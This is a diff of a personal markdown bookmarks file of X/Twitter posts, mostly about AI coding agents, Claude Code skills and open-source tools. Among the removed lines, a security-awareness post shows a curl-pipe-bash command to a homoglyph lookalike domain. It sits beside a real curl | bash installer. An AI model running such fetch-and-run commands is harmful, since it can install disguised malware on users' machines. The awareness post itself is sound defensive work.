@@ -1,1064 +1,850 @@
-# X/Twitter Bookmarks 2026
+# X/Twitter Bookmarks - March 2026
 
-[[2026-01-01]] 🗓️
+*Note: Some entries may have truncated text where 'Show more' buttons were present*
 
-**@thsottiaux** / https://x.com/thsottiaux/status/2006624792531923266
+[[2026-03-28]] 🗓️
 
-Skill file:
+@garrytan
 
----
-name: ask-questions-if-underspecified
-description: Clarify requirements before implementing. Do not use automatically, only when invoked explicitly.
----
+I have to say this interview changed my life. Hearing how Boris thinks about software spurred me to work much harder on releasing my own way of doing things and on iterating fast on how I build. Hard to believe it has only been a month since this one.
 
-# Ask Questions If Underspecified
-
-## Goal
-
-Ask the minimum set of clarifying questions needed to avoid wrong
+- https://x.com/garrytan/status/2037772478198739346
 - Link: none
-
-[[2026-01-02]] 🗓️
-
-**@d0xxed** / https://x.com/d0xxed/status/2007213826190778443
-
-here's everything that didn't fit in the video:
-1. opt-in markers for within your config 
-2. full CLI support with JSON output for custom scripting 
-3. helper commands and harness status legend
-4. awesome horse statue
-
-give it a try :P 
-
-https://github.com/neiii/bridle
-- Link: https://github.com/neiii/bridle
-
-**@nummanali** / https://x.com/nummanali/status/2007221906974589317
-
-Link to the Repo
-- Link: https://github.com/numman-ali/cc-mirror
-
-**@kepano** / https://x.com/kepano/status/2007223691315499199
-
-if you're using Obsidian with Claude Code, tell me about your workflow, and what you've used it for
-- Link: none
-
-**@jefftangx** / https://x.com/jefftangx/status/2007230663553151281
-
-oh you're still on Claude Code? we're orchestrating agents with Beads now. wait, Steve Yegge just shipped Gas Town, it's like Kubernetes for Coding Agents. just kidding, we put Ralph Wiggums in a for loop. we gave him a phone number and bank account and asked him to autonomously
-- Link: none
-
-[[2026-01-03]] 🗓️
-
-**@Mng64218162** / https://x.com/Mng64218162/status/2007246737191383275
-
-i highly recommend https://github.com/Mng-dev-ai/claudex it uses Claude Agent SDK with native sandbox and many features
-- Link: https://github.com/Mng-dev-ai/claudex
-
-**@alexhillman** / https://x.com/alexhillman/status/2007277267253366876
-
-i was thinking to myself "I don't want to just chat with a plan, i want to mark it up like a google doc" and
-
-LOOKS LIKE SOMEONE READ MY MIND
-
-https://github.com/backnotprop/plannotator?tab=readme-ov-file
-
-this looks awesome, excited to fold it into my planning workflow
-- Link: https://github.com/backnotprop/plannotator
-
-**@nikunj** / https://x.com/nikunj/status/2007337666594123974
-
-Claude Skills is really slept upon.. 
-
-Built this "daily brief" skill that goes through my iMessage & WhatsApp (both locally), Gmail & GCal 
-
-to give me a full update on things and prep (w/ web research) for my meetings. 
-
-Even an EA can't do this amount of thorough vetting!
-- Link: none
-
-**@_colemurray** / https://x.com/_colemurray/status/2007360646162329986
-
-am not yet ready to hand over everything to Claude
-
-I built a categorizer that uses local gpt-oss and runs locally on your Gmail
-- Link: https://github.com/colemurray/gmail-categorizer
-
-[[2026-01-04]] 🗓️
-
-**@aref_vc** / https://x.com/aref_vc/status/2007728660854481380
-
-just keeping it simple, as it is focused on capture and processing (below my setup workflow)
-- Link: none
-
-[[2026-01-05]] 🗓️
-
-**@nummanali** / https://x.com/nummanali/status/2007975208402264202
-
-Please note:
-- Installer replaces your opencode.json block for OpenAI
-- Reasoning now toggled with CTRL + T
-
-GitHub Link:
-- Link: https://github.com/numman-ali/cc-mirror
-
-**@nummanali** / https://x.com/nummanali/status/2007984449120874681
-
-This is so insane lol - CC Mirror Maxing Agents
-
-Literally cannot believe, that all it took was getting the orchestration skill to the point where the bare primitives could go full throttle 
-
-Go read the skill if you want to learn more:
-
-https://github.com/numman-ali/cc-mirror/blob/main/src/skills/orchestration/SKILL.md
-- Link: https://github.com/numman-ali/cc-mirror/blob/main/src/skills/orchestration/SKILL.md
-
-**@LiorOnAI** / https://x.com/LiorOnAI/status/2008161724902355118
-
-You can now give infinite memory to Claude Code.
-
-Claude-Mem just released a free open source memory plugin by thedotmack.
-
-It saves context so Claude resumes work without reexplaining everything.
-
-𝗣𝗲𝗿𝘀𝗶𝘀𝘁𝗲𝗻𝘁 𝗺𝗲𝗺𝗼𝗿𝘆 𝗳𝗼𝗿 𝗖𝗹𝗮𝘂𝗱𝗲 𝗖𝗼𝗱𝗲
-Claude-Mem records
-- Link: none
-
-**@joshmanders** / https://x.com/joshmanders/status/2008224952382804386
-
-New section added to all my AGENTS.md files.
-- Link: https://joshmanders.com/notes/claude-code-tips
-
-**@its_mohamedomar** / https://x.com/its_mohamedomar/status/2008246583347847514
-
-Memvid v2 is finally here!
-
-And it gives every AI agent long term memory in a single file.
-
-(1/6) Six months ago, Memvid broke the internet.
-
-→ Over 10M views on launch
-→ 10K+ stars on GitHub
-→ And thousands of developers building with it
-
-But that was just the beginning.
-- Link: none
-
-**@nummanali** / https://x.com/nummanali/status/2008272283261931948
-
-I orchestrate with Opus 4.5 in Claude Code. 
-
-It uses built in sub agents or Codex with the following:
-
-Use Codex as a sub agent for backend and complex engineering tasks, run in background mode:
-
-codex exec -m gpt-5.2-codex -c model_reasoning_effort="xhigh" "<prompt>"
-- Link: none
-
-[[2026-01-06]] 🗓️
-
-**@kepano** / https://x.com/kepano/status/2008578873903206895
-
-I'm starting a set of Claude Skills for Obsidian... so far they're centered around helping Claude Code edit .md, .base, and .canvas files
-- Link: https://github.com/kepano/claude-skills-obsidian
-
-**@trq212** / https://x.com/trq212/status/2008610538763559356
-
-one of the benefits of a detailed spec is that verification is also easier, after the work is done I like to add:
-
-"spin up a subagent to read the spec file and verify if work has been completed, have it give feedback if not and then address the feedback"
-- Link: none
-
-**@mattpocockuk** / https://x.com/mattpocockuk/status/2008622410342261107
-
-A Ralph script for writing tests on untested features:
-- Link: none
-
-**@mattpocockuk** / https://x.com/mattpocockuk/status/2008622412749750722
-
-- Link: https://github.com/mattpocock/ralph-scripts
-
-**@ctatedev** / https://x.com/ctatedev/status/2008650242221371859
-
-And, of course, naturally, it's open source
-- Link: https://github.com/ctate/ralph-tui
-
-**@BLUECOW009** / https://x.com/BLUECOW009/status/2008659311145390552
-
-this prompt is crazy it completely changes how claude behaves
-
-<context>
-This text establishes a field, not a task.
-Interpretation is allowed to compete with itself.
-</context>
-
-<density>
-∅ ⇄ ∞
-before/after
-cause ⟂ effect
-signal ≠ meaning
-structure precedes symbol
-</density>
-- Link: none
-
-[[2026-01-08]] 🗓️
-
-**@Shpigford** / https://x.com/Shpigford/status/2009087477013709093
-
-"real" programmers are going to drag me through the mud on this but alas i could not care less.
-
-tl;dr i now have claude run a full "suite" of E2E tests using plain english + playwright
-
-traditional E2E tests are a giant pain to maintain. they're incredibly fragile and just not a
-- Link: none
-
-[[2026-01-09]] 🗓️
-
-**@alexhillman** / https://x.com/alexhillman/status/2009494226741154034
-
-tried working in someone else's claude code system today and i genuinely don't know how people use claude code without Kuato.
-- Link: https://github.com/backnotprop/kuato
-
-**@nummanali** / https://x.com/nummanali/status/2009732660201947246
-
-Make @opencode work like Claude Code with this new plugin
-
-This Behavior Adjustment System (BAS) Plugin detects conversation topics and applies relevant behavioral templates as <system_reminder> XML tags as Claude Code would
-
-GitHub Repo:
-
-https://github.com/btriapitsyn/opencode-bas-plugin
-- Link: https://github.com/btriapitsyn/opencode-bas-plugin
-
-[[2026-01-10]] 🗓️
-
-**@parcadei** / https://x.com/parcadei/status/2009808092247085531
-
-https://github.com/parcadei/Continuous-Claude-v3
-
-continuous claude v3 is finally done 
-
-same problem, new architecture, better engineering.
-
-a setup designed to explore solutions to recurring obstacles in agentic coding:
-
-context, memory, learning, math, codebase exploration and much more
-
-strap in,
-- Link: https://github.com/parcadei/Continuous-Claude-v3
-
-**@doodlestein** / https://x.com/doodlestein/status/2009842329645953327
-
-I included the miniature version of this prompt here because the "My Favorite Prompts" series are supposed to be compact, bite-sized, self-contained nuggets. 
-
-But today I transformed this into a truly insane system. It's not relevant if you're making another CRUD program in
-- Link: none
-
-**@nateberkopec** / https://x.com/nateberkopec/status/2009873774909575440
-
-I'm moving to fnox for secrets management. I'm growing concerned about agents rogue-reading secrets out of files, so I'm using fnox to keep secrets inside 1Password and requiring TouchID to unlock. Great integration with mise ofc, which I already use.
-- Link: none
-
-**@ivanfioravanti** / https://x.com/ivanfioravanti/status/2009957485231362252
-
-Here gist with prompt used:
-- Link: https://gist.github.com/ivanfioravanti
-
-**@jarrodwatts** / https://x.com/jarrodwatts/status/2009958635489898824
-
-i *would be* trying it out with this other thing i found to use my existing subscriptions https://github.com/automazeio/vibeproxy
-
-but since it's against terms of service, i definitely will not try it out
-- Link: https://github.com/automazeio/vibeproxy
-
-[[2026-01-11]] 🗓️
-
-**@_EricHu** / https://x.com/_EricHu/status/2010216809648271674
-
-If, like me, you've been having fun with the Obsidian+Claude Code combo, you need to take a look at qmd by @tobi.
-
-It's meaningfully improved claude's ability beyond grep/glob to connect the dots and surface connections in my setup.
-- Link: https://github.com/tobilg/qmd
-
-**@BLUECOW009** / https://x.com/BLUECOW009/status/2010221837389570364
-
-I ran 18 tests on a prompting technique called Code Field.
-
-The prompt is 4 lines. All negations. No instructions on what to do—only what not to do.
-
-Code generation results:
-Assumptions stated went from 0% to 100%. Every response listed its assumptions before writing code. Zero
-- Link: none
-
-[[2026-01-12]] 🗓️
-
-**@HiroroWork** / https://x.com/HiroroWork/status/2010578471089738102
-
-The MCP Server was a bit unstable for me, so I built an Agent Skill to call Codex from Claude Code instead. I also sometimes get Gemini involved for brainstorming sessions.
-
-https://github.com/hiroro-work/claude-plugins/blob/main/plugins/ask-codex/skills/ask-codex/SKILL.md
-- Link: https://github.com/hiroro-work/claude-plugins
-
-**@DataChaz** / https://x.com/DataChaz/status/2010655002172571721
-
-Wow, such a great open-source drop!
-
-Put Claude on steroids with 120+ scientific skills spanning maths, biology, chemistry, medicine, engineering, & more 
-
-If you've ever wanted Claude to act like a research assistant, this gets very close.
-
-Free and open source.
-
-Repo in ↓
-- Link: none
-
-**@theplgeek** / https://x.com/theplgeek/status/2010656497009578448
-
-ralph-tui is cooking. All-in-one ralph engine with e2e observability
-
-- extensible by design
-- plugin agents (ships with cc and @opencode plugins)
-- plugin trackers (ships with json, beads, and beads-bv plugins)
-- built in interactive prd creator (leverages skills)
-- auto prd
-- Link: none
-
-**@doodlestein** / https://x.com/doodlestein/status/2010715429598118171
-
-This new project of mine replaces that and is much better:
-- Link: https://github.com/Dicklesworthstone/mcp_agent_mail
-
-**@tdhopper** / https://x.com/tdhopper/status/2010839641453220340
-
-If you're shipping AI-generated Python, level up your output by adding http://skills.md to your repo.
-
-It's a tiny contract that tells the model how your codebase actually works (style, patterns, footguns).
-
-Here's the playbook + examples from the Dagster team:
-- Link: https://skills.md
-
-[[2026-01-13]] 🗓️
-
-**@alexhillman** / https://x.com/alexhillman/status/2010913846978924979
-
-Overdue addition to my claude dot md
-
-# Global Claude Code Preferences
-
-## Communication Style
-- Never end sentences with ellipses (...) - it comes across as passive aggressive
-- Ask questions one at a time
-- Acknowledge requests neutrally without enthusiasm inflation
-- Skip
-- Link: none
-
-**@doodlestein** / https://x.com/doodlestein/status/2010914784993010030
-
-While writing the quoted post earlier today, I couldn't help but notice just how much boring, annoying grunt work was involved, particularly when the number of revisions is high.
-
-Luckily, the post itself served as an excellent basis to make a quick tool that can totally automate
-- Link: none
-
-**@doodlestein** / https://x.com/doodlestein/status/2010925420292501628
-
-If you really want to make GPT Pro sweat, give it a ~5,800 line bash script and then tell it (without any real evidence, who knows if it's true) that it is riddled with errors and bugs:
-
-"I have this script which does work, and you should first analyze it incredibly carefully and
-- Link: none
-
-**@chris_mccord** / https://x.com/chris_mccord/status/2010928959840506051
-
-forked from the lovely gotty and added tmux integration with much better mobile support. Single portable binary:
-- Link: https://github.com/nickvdyck/ghostty
-
-**@kr0der** / https://x.com/kr0der/status/2011135975288946932
-
-- Link: none
-
-[[2026-01-14]] 🗓️
-
-**@alexhillman** / https://x.com/alexhillman/status/2011294603723313351
-
-Early in building my exec assistant system, I created a workflow to capture proto-ideas that I don't want to forget but don't have time to explore or implement right now. 
-
-I call them "seeds" and they all go into a folder with markdown that captures the idea, the context that
-- Link: none
-
-[[2026-01-15]] 🗓️
-
-**@doodlestein** / https://x.com/doodlestein/status/2011607921667232170
-
-If you don't want to dive directly into my entire Flywheel system all at once, at least try this:
-
-1. Install agent mail using the curl | bash one-liner:
-
-curl -fsSL "https://raw.githubusercontent.com/Dicklesworthstone/mcp_agent_mail/main/scripts/install.sh?$(date +%s)" | bash -s -- --yes
-
-That will automatically install beads if you don't already have
-- Link: https://github.com/Dicklesworthstone/mcp_agent_mail
-
-**@dazuck** / https://x.com/dazuck/status/2011860692878426432
-
-I've been building up a suite of Skills for Claude/CC geared towards my role / non-devs. Strategy, Ops, email triage, briefings, coaching and much more.
-
-Cleaned up and OS'd the most generalizable . If you're an operator (or PM, founder) this might be useful.
-- Link: none
-
-**@iannuttall** / https://x.com/iannuttall/status/2011878634743873759
-
-Lots of people saying to use vibeproxy or cliproxyapi but I'd love native ChatGPT plans in droid tbf
-- Link: none
-
-**@alvinsng** / https://x.com/alvinsng/status/2011910690911515103
-
-ralph-tui is quickly growing: created 4 days ago and now with 750+ stars on Github
- 
-Works with Claude Code, OpenCode and now, Factory Droid!
-
-https://github.com/subsy/ralph-tui
-- Link: https://github.com/subsy/ralph-tui
-
-[[2026-01-16]] 🗓️
-
-**@IterIntellectus** / https://x.com/IterIntellectus/status/2012220254504530043
-
-- Link: none
-
-[[2026-01-17]] 🗓️
-
-**@hunterhammonds** / https://x.com/hunterhammonds/status/2012549574775177444
-
-Who is using Obsidian + Claude Code?
-
-I want to talk to you.
-- Link: none
-
-[[2026-01-18]] 🗓️
-
-**@htmx_org** / https://x.com/htmx_org/status/2012688929833795783
-
-just posted a video for my students explaining why they *have* to write the sort of code that, yes, can be generated by an LLM
-
-I am giving them this AGENTS.md file:
-
-https://gist.github.com/1cg/a6c6f2276a1fe5ee172282580a44a7ac
-
-and telling them "Look, here are the guard rails.  I can't make you use
-- Link: https://gist.github.com/1cg/a6c6f2276a1fe5ee172282580a44a7ac
-
-**@mattpocockuk** / https://x.com/mattpocockuk/status/2012906065856270504
-
-Bad AGENTS.md files can make your coding agent worse and cost you tokens.
-
-Here's a prompt you can use to clean them up - PLUS a full guide for folks wanting to learn more.
-
-Enjoy: https://aihero.dev/s/KQLczQ
-- Link: https://aihero.dev/s/KQLczQ
-
-[[2026-01-19]] 🗓️
-
-**@waynesutton** / https://x.com/waynesutton/status/2013373368117141745
-
-Now you can track your @opencode and @claudeai CLI coding sessions in one place.
-
-http://opensync.dev provides searchable history, markdown export, and eval-ready datasets. 
-
-See tool usage, token spend, and session activity across projects.
-
-Check out the demo.
-- Link: https://opensync.dev
-
-[[2026-01-22]] 🗓️
-
-**@doodlestein** / https://x.com/doodlestein/status/2014182649955266882
-
-Take a look at these:
-
-Planning related X posts:
-
-https://x.com/doodlestein/status/2007588870662107197?s=20
-
-https://x.com/doodlestein/status/2008813776687030781?s=20
-
-https://x.com/doodlestein/status/2008683457715548549?s=20
-
-https://x.com/doodlestein/status/2004650413484658735?s=20
-
-https://x.com/doodlestein/status/1997777154612797787?s=20
-- Link: none
-
-**@mattpocockuk** / https://x.com/mattpocockuk/status/2014277127244296688
-
-AFK Ralph in a bash loop is SO much better than the Claude Code plugin.
-
-But the DX is a bit nasty. Running it AFK means no streaming to the terminal by default.
-
-This script fixes it:
-
-https://aihero.dev/s/lvmQGl
-- Link: https://aihero.dev/s/lvmQGl
-
-**@mattpocockuk** / https://x.com/mattpocockuk/status/2014336302120923513
-
-My Ralph setup has evolved a LOT since you last saw it.
-
-It's totally AFK, closing GitHub issues while I work on my courses.
-
-I've learned a lot along the way. Here's a breakdown:
-- Link: none
-
-**@alexhillman** / https://x.com/alexhillman/status/2014420478518083714
-
-excellent new resource from @mattpocockuk on keeping your claude.md (or agents.md if you're on a cc alternative) small and WHY it's so important. 
-
-https://aihero.dev/a-complete-guide-to-agents-md
-- Link: https://aihero.dev/a-complete-guide-to-agents-md
-
-**@adithya_s_k** / https://x.com/adithya_s_k/status/2014426458475966649
-
-Now you can also create animations like @3blue1brown
- 
- excited to introduce manim_skills 
-
-$ npx skills add adithya-s-k/manim_skill
-
-This animation was created just by prompting
-- Link: none
-
-[[2026-01-23]] 🗓️
-
-**@_avichawla** / https://x.com/_avichawla/status/2014586815714664698
-
-Researchers built a new RAG approach that:
-
-- does not need a vector DB.
-- does not embed data.
-- involves no chunking.
-- performs no similarity search.
-
-And it hit 98.7% accuracy on a financial benchmark (SOTA).
-
-Here's the core problem with RAG that this new approach solves:
-- Link: none
-
-**@mattpocockuk** / https://x.com/mattpocockuk/status/2014627397241282564
-
-Anthropic's Ralph plugin sucks, and you shouldn't use it
-
-It defeats the entire purpose of Ralph - to aggressively clear the context window on each task to keep the LLM in the smart zone.
-
-Full article here: https://aihero.dev/s/9tdgRM
-- Link: https://aihero.dev/s/9tdgRM
-
-**@kitlangton** / https://x.com/kitlangton/status/2014665890353012752
-
-This is so good.
-- Link: https://github.com/kitlangton/scala-parallel-regex
-
-**@doodlestein** / https://x.com/doodlestein/status/2014807563183992890
-
-Agent coding life hack:
-
-Just spent a bunch of time giving detailed instructions to Claude Code with Opus 4.5? 
-
-Get more leverage out of it by using this template with Codex and GPT 5.2 xHigh:
 
 ---
 
-Now, I just asked another agent (Claude Code Opus 4.5) to do the following:
+[[2026-03-21]] 🗓️
+
+@oskargroth
+
+Did you set up the MCP, open Hopper and open a document with a binary to disassemble?
+
+- https://x.com/oskargroth/status/2035473718776889613
+- Link: https://t.co/djG4PsdTcv
+
+---
+
+[[2026-03-21]] 🗓️
+
+@simonw
+
+Still a work in progress, but I've published the first draft of a new chapter on "Using Git with coding agents"
+
+- https://x.com/simonw/status/2035482121037635798
+- Link: https://t.co/uP2DGVcMtQ
+
+---
+
+[[2026-03-20]] 🗓️
+
+@oskargroth
+
+https://
+
+- https://x.com/oskargroth/status/2035020185065685272
+- Link: https://t.co/2sZAs1O6Gh
+
+---
+
+[[2026-03-20]] 🗓️
+
+@firecrawl
+
+The Firecrawl plugin is now available in    
+
+$ npm install -g firecrawl-cli
+
+Let agents scrape, search, and browse the web for real-time context - right from your terminal.
+
+- https://x.com/firecrawl/status/2035045665777258515
 - Link: none
 
-[[2026-01-24]] 🗓️
+---
 
-**@levelsio** / https://x.com/levelsio/status/2015015315378483607
+[[2026-03-20]] 🗓️
 
-Complete skill issue and worrying to see people still not automate this in 2026
+@DoctorLemma
 
-– manually changing a user's email address
+Sixteen years ago, one man stood alone on a grassy hill at a music festival in Washington State, USA, and started dancing by himself. People glanced over and looked away. Some laughed. His roommate leaned in and warned him people were filming him.
 
-This should be fully automated in your user's login dashboard
+He did not stop.
 
-– or sending them invoice details for the third time because they didn't read your messages
+Then one
+
+- https://x.com/DoctorLemma/status/2034958327055020168
 - Link: none
 
-**@timolins** / https://x.com/timolins/status/2015023461580591189
+---
 
-Before you buy that Mac Mini for clawdbot:
+[[2026-03-20]] 🗓️
 
-Get yourself UTM and setup up a macOS virtual machine for it.
+@Dan_Jeffries1
 
-It's free - and gives your lobster a safe home.
+I think I finally figured out why OpenClaw is amazing and took off like wild fire and why Peter is a genius, as Altman called him.
 
-And if you end up buying that Mac Mini anyways, you can just copy the .utm file over and you're done.
+And it's actually a different way of looking at it.
 
-I was surprised how
+It's not a DeepSeek moment for agents.
+
+It's a Napster moment.
+
+And just like Napster it will
+
+- https://x.com/Dan_Jeffries1/status/2034916790711538061
 - Link: none
 
-**@ivanfioravanti** / https://x.com/ivanfioravanti/status/2015090951530725801
+---
 
-You are totally right. Here a quick one.
-uv run mlx_audio.tts.generate --model mlx-community/Qwen3-TTS-12Hz-1.7B-VoiceDesign-bf16 --text "It's in the top drawer... wait, it's empty? No way, that's impossible! I'm sure I put it there" --instruct "Speak in a tone of fear, with a
+[[2026-03-19]] 🗓️
+
+@BrianRoemmele
+
+BOOM: A Grok Superpower!
+
+I have been using    to produce a live summary of meetings where the subject matter is not proprietary and the participants agree with astonishing results!
+
+You should too.
+
+How it works:
+
+Press the microphone icon in the Grok app and read this
+
+- https://x.com/BrianRoemmele/status/2034637633817883023
 - Link: none
 
-**@francedot** / https://x.com/francedot/status/2015178880215298557
+---
 
+[[2026-03-19]] 🗓️
+
+@chamath
+
+This is really well summarized here. 
+
+People ask me why we focused 8090 on (complex) enterprise engagements from day 1 and not small entrepreneurs. 
+
+The answer is that this is where all the action is. The second is that the concept of digital sovereignty will become part of the
+
+- https://x.com/chamath/status/2034717982216397074
 - Link: none
 
-[[2026-01-25]] 🗓️
+---
 
-**@doodlestein** / https://x.com/doodlestein/status/2015275392098017303
+[[2026-03-19]] 🗓️
 
-You can get Claude to reliably clean up its own messes if you just repeat this prompt 3 to 5 times after it writes some code for you (I do this hundreds of times a day):
+@coreyganim
 
-Great, now I want you to carefully read over all of the new code you just wrote and other existing code you
+What I love about this article is that it shows you what to actually DO with Paperclip.
+
+The stack:
+→ Paperclip = your AI company (assigns work, tracks progress)
+→ gstack = your engineering team (15 specialist skills from Garry Tan)
+→ autoresearch = your R&D lab (100
+
+- https://x.com/coreyganim/status/2034717504505823728
 - Link: none
 
-**@Schwalm5132** / https://x.com/Schwalm5132/status/2015470661490057540
+---
 
-As a former Special Forces Warrant Officer with multiple rotations running counterinsurgency ops—both hunting insurgents and trying to separate them from sympathetic populations—I've seen organized resistance up close. From Anbar to Helmand, the pattern is familiar: spotters,
+[[2026-03-19]] 🗓️
+
+@arpagon
+
+In this era where Fork = Inspiration 
+
+I went through tons of extensions on  http://  and the one that stood out the most was   https:// roviders …  by   
+
+Just like  , I prefer running my "own" opinionated code as a Pi extension. So I forked it
+
+- https://x.com/arpagon/status/2034639135701443051
+- Link: https://t.co/2o9IUw9AzQ
+
+---
+
+[[2026-03-19]] 🗓️
+
+@llama_index
+
+We've spent years building LlamaParse into the most accurate document parser for production AI. Along the way, we learned a lot about what fast, lightweight parsing actually looks like under the hood.
+
+Today, we're open-sourcing a light-weight core of that tech as LiteParse 
+
+- https://x.com/llama_index/status/2034661997644808638
 - Link: none
 
-[[2026-01-26]] 🗓️
+---
 
-**@ginacostag_** / https://x.com/ginacostag_/status/2015774167321506101
+[[2026-03-19]] 🗓️
 
-You're negotiating your salary.
+@ThePBXGuy
 
-They ask: "What are your expectations?"
+If gstack is too complicated, they can always try gstack-auto! Just write a spec and let the bots figure out all of the details:
 
-You throw out a number.
-Silence.
+- https://x.com/ThePBXGuy/status/2034494315737891218
+- Link: https://t.co/hQ7NrUMlIE
 
-Interview ends. Offer is $15K less than you're worth.
+---
 
-Say this instead:
+[[2026-03-18]] 🗓️
+
+@DanielGri
+
+I forked   ( https:// esearch … ) to work with my 
+ https:// active-subagents … 
+and ran in on   Ruby SDK. Results? ~50% less memory usage (PR:  https:// ry-ruby/pull/2901 … )
+But the cool thing about it is, the main session used up ~8% of it's context cause of subagents.
+
+- https://x.com/DanielGri/status/2034288098608034073
+- Link: https://t.co/Dovayx4AA8
+
+---
+
+[[2026-03-18]] 🗓️
+
+@codyschneiderxx
+
+if you build an email marketing platform that allows you do everything through the API
+
+you will make so much money
+
+- https://x.com/codyschneiderxx/status/2034283694945456474
 - Link: none
 
-**@karpathy** / https://x.com/karpathy/status/2015883857489522876
+---
 
-A few random notes from claude coding quite a bit last few weeks.
+[[2026-03-18]] 🗓️
 
-Coding workflow. Given the latest lift in LLM coding capability, like many others I rapidly went from about 80% manual+autocomplete coding and 20% agents in November to 80% agent coding and 20% edits+touchups in
+@mattshumer_
+
+Even easier, just tell your agent:
+
+"Clone  https:// , read  https:// /blob/main/skills/unslop/SKILL.md … , run unslop for YOUR_DOMAIN_HERE, review unslop-output/analysis.md and unslop-output/skill.md for specificity, and return the finished skill file plus the main repeated patterns you
+
+- https://x.com/mattshumer_/status/2034357817524789500
+- Link: https://t.co/Vwo8QRjJkQ
+
+---
+
+[[2026-03-18]] 🗓️
+
+@garrytan
+
+I just launched /office-hours skill with gstack. 
+
+Working on a new idea? GStack will help you think about it the way we do at YC. 
+
+(It's only a 10% strength version of what a real YC partner can do for you, but I assure you that is quite powerful as it is.)
+
+- https://x.com/garrytan/status/2034304114574909681
 - Link: none
 
-[[2026-01-27]] 🗓️
+---
 
-**@bcherny** / https://x.com/bcherny/status/2015989512288272622
+[[2026-03-17]] 🗓️
 
-Yep here's an example. /dedupe skill invoked on every issue
-- Link: https://github.com/bcherny/beads-dedupe-skill
+@askalphaxiv
 
-[[2026-01-28]] 🗓️
+Add to Claude Code: claude mcp add --transport http alphaxiv  https://  (and then run /mcp in claude to authenticate)
 
-**@Diptish09** / https://x.com/Diptish09/status/2016498308789973330
+Docs:
 
-FINAL INTERVIEW.
-They ask: "Why should we hire you?"
-Your mind blanks.
+- https://x.com/askalphaxiv/status/2034003208146940407
+- Link: https://t.co/14uLrgtFjI
 
-You say "hardworking and passionate."
-Interview ends. No offer.
+---
 
-Here's what they actually want…
+[[2026-03-17]] 🗓️
+
+@hwchase17
+
+a lot of engineering orgs (Stripe, Ramp, Coinbase) are building internal cloud coding agents
+
+we're releasing a fully OSS one today - every company should have the  power of cloud agents at their fingertips
+
+- https://x.com/hwchase17/status/2033977192053612621
 - Link: none
 
-**@ryancarson** / https://x.com/ryancarson/status/2016520542723924279
+---
 
+[[2026-03-17]] 🗓️
+
+@tomaslaucom
+
+Indeed. Reminds me of Amos Tversky, "You waste years by not being able to waste hours."
+
+- https://x.com/tomaslaucom/status/2033915399922692519
 - Link: none
 
-**@turborepo** / https://x.com/turborepo/status/2016581053507653912
+---
 
-Turborepo 2.8 is the build system for agentic coding:
+[[2026-03-17]] 🗓️
 
-· Shared local caching for Git worktrees
-· Agent Skill: npx skills add vercel/turborepo
-· Docs: AI chat, Markdown responses, turbo docs subcommand, and more
-- Link: https://turbo.build/blog/turborepo-2-8
+@mattshumer_
 
-[[2026-01-29]] 🗓️
+Add this to your Codex custom instructions for a way better experience:
 
-**@bran_don_gell** / https://x.com/bran_don_gell/status/2016933502302957898
+"When communicating your results back to me, explain what you did and what happened in plain, clear English. Avoid jargon, technical implementation details, and code-speak in your final responses. Write as
 
-I'm open sourcing @every's CFO skill and calling Charlie––after Charlie Munger––who embodied the principle that capital discipline is a competitive advantage. 
-
-You can work with Claude Code or Codex to connect all of your financial sources (for us, @mercury, @stripe,
+- https://x.com/mattshumer_/status/2033952179354996868
 - Link: none
 
-[[2026-02-01]] 🗓️
+---
 
-**@0xSero** / https://x.com/0xSero/status/2017944775110910107
+[[2026-03-17]] 🗓️
 
-I am ripping out all my ai-sdk/agent/filesystem slopgic and replacing it with Pi-ai, a copy of pods, and agent-core.
+@koylanai
 
-It's very well written. Wish I dug deeper earlier save myself the hassle. 
+This is probably the best article I’ve read on Skills.
 
-https://github.com/badlogic/pi-mono
-- Link: https://github.com/badlogic/pi-mono
+A few points from the article:
+- The best skills are narrow. When a skill tries to span multiple jobs, reliability drops.
+- The highest-signal part is the gotchas section. That is where real tacit knowledge gets encoded.
+-
 
-**@EXM7777** / https://x.com/EXM7777/status/2018022297345654870
-
-turn this thread into instructions for your claude[.]md file
-
-this might just change your life
+- https://x.com/koylanai/status/2033966713394372682
 - Link: none
 
-[[2026-02-02]] 🗓️
+---
 
-**@anthonyriera** / https://x.com/anthonyriera/status/2018221220160827828
+[[2026-03-17]] 🗓️
 
-I tested every Claude Code skills and one DESTROYED the rest: "Planning with files".
+@UnslothAI
 
-This skill is literally a cheat code. It nails every feature, even complicated ones, 99% of the time.
+Introducing Unsloth Studio  
+A new open-source web UI to train and run LLMs.
 
-If you're not using it, you're leaving wins on the table.
+• Run models locally on Mac, Windows, Linux
+• Train 500+ models 2x faster with 70% less VRAM
+• Supports GGUF, vision, audio, embedding models
+• Auto-create datasets from PDF, CSV, DOCX
+•
 
-First to start using it simply
-- Link: https://github.com/anthonyriera/planning-with-files
-
-**@wesmckinn** / https://x.com/wesmckinn/status/2018303622145065455
-
-I've used Gmail for 20 years. Almost 2M emails, 150K attachments. Rather than let Google hold my data hostage, I built msgvault: local-first email archive with a terminal UI and MCP server, powered by DuckDB. Open source, single Go binary.
-- Link: https://github.com/wesm/msgvault
-
-**@VittoStack** / https://x.com/VittoStack/status/2018326274440073499
-
-We spent 48+ hours researching security-first OpenClaw setups.
-
-By the end of this guide you'll have:
-- OpenClaw on a Pi via Tailscale
-- Matrix E2E chat
-- Prompt injection hardening
-- No-log LLM provider
-- Firewall + habits for damage control
-
-It's long but totally worth it.
+- https://x.com/UnslothAI/status/2033926272481718523
 - Link: none
 
-**@ryancarson** / https://x.com/ryancarson/status/2018354837918732297
+---
 
+[[2026-03-16]] 🗓️
+
+@ManusAI
+
+Today, we're taking Manus out of the cloud and putting it on your desktop.
+
+Introducing My Computer, the core feature of the new Manus Desktop app. It’s your AI agent, now on your local machine.
+
+- https://x.com/ManusAI/status/2033558672152854712
 - Link: none
 
-**@sheeki03** / https://x.com/sheeki03/status/2018382483465867444
+---
 
-Be honest. When was the last time you actually read a command before pasting it into your terminal?
+[[2026-03-16]] 🗓️
 
-Because these two lines look identical:
+@mattpocockuk
 
-curl -sSL https://install.example-cli | bash
-curl -sSL https://іnstall.example-clі | bash
+Here!
 
-One installs your tool. The other steals your
-- Link: https://sheki.io/posts/curl-pipe-bash
+- https://x.com/mattpocockuk/status/2033651305474908438
+- Link: https://t.co/h9JB7mvS77
 
-**@ctatedev** / https://x.com/ctatedev/status/2018412101346148467
+---
 
-I've released a lot of packages lately.
+[[2026-03-16]] 🗓️
 
-Tried AI agents. Still lots of typing, lots of copy-paste, inconsistent results.
+@DanielGri
 
-So I shipped the last package I'll ever ship manually: autoship
+I created a Pi extension that replaces   Subagents for me  
